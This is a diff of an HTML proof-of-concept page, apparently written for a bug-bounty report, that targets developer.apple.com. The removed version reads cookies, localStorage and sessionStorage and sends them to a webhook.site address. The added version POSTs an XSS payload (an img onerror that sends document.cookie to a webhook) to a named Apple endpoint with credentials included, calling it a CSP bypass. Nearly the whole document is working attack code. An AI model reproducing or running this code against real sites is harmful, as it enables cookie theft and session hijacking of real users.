@@ -1,35 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Apple Security PoC - Exfiltration Test</title>
+  <meta charset="utf-8">
+  <title>Apple Developer CSD PoC</title>
 </head>
 <body>
-<h1>Apple Security Proof of Concept</h1>
-<script>
-(async () => {
-  // Webhook endpoint to collect test results
-  const webhook = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";
+  <h2>Apple Developer Client-Side Desync PoC</h2>
+  <p>This page demonstrates how a crafted request can lead to CSP bypass.</p>
 
-  try {
-    // Collect simple browser data for proof only
-    const proofData = {
-      target: "developer.apple.com",   // Explicit target for Apple
-      cookies: document.cookie,
-      localStorage: JSON.stringify(localStorage),
-      sessionStorage: JSON.stringify(sessionStorage),
-      location: location.href,
-      userAgent: navigator.userAgent,
-      proof: "Apple Unified PoC"
-    };
+  <script>
+    // Webhook الخاص بك لإثبات التنفيذ
+    const webhook = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";
 
-    // Send the data to webhook
-    new Image().src = `${webhook}?data=${encodeURIComponent(JSON.stringify(proofData))}`;
-    console.log("[+] Apple PoC data sent:", proofData);
-  } catch (err) {
-    console.error("PoC execution failed:", err);
-  }
-})();
-</script>
+    // نص الـ payload (هنا مجرد مثال بسيط)
+    const payload = "<img src=x onerror=\"fetch('" + webhook + "?cookie='+document.cookie)\">";
+
+    // إرسال طلب POST إلى endpoint المصاب
+    fetch("https://developer.apple.com/search/services/v1/quick-links/", {
+      method: "POST",
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      body: "payload=" + encodeURIComponent(payload),
+      credentials: "include"
+    })
+    .then(res => res.text())
+    .then(text => {
+      console.log("Response received:", text.slice(0,200));
+      document.body.innerHTML += "<pre>Response snippet:\n" + text.slice(0,200) + "</pre>";
+    })
+    .catch(err => console.error("PoC Error:", err));
+  </script>
 </body>
 </html>
